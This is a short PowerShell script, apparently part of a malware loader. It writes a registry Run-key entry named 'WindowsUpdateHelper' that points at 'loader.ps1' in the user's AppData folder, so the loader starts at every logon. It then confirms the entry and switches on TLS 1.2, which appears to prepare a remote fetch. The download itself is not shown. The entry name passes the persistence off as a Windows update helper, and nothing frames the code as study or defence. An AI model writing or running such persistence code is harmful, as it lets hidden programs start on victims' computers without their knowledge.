
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$PersistencePath = "$env:APPDATA\loader.ps1",
    [string]$RegistryValue = "WindowsUpdateHelper"
)
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RegistryValue -Value $PersistencePath -PropertyType String -Force
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegistryValue
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
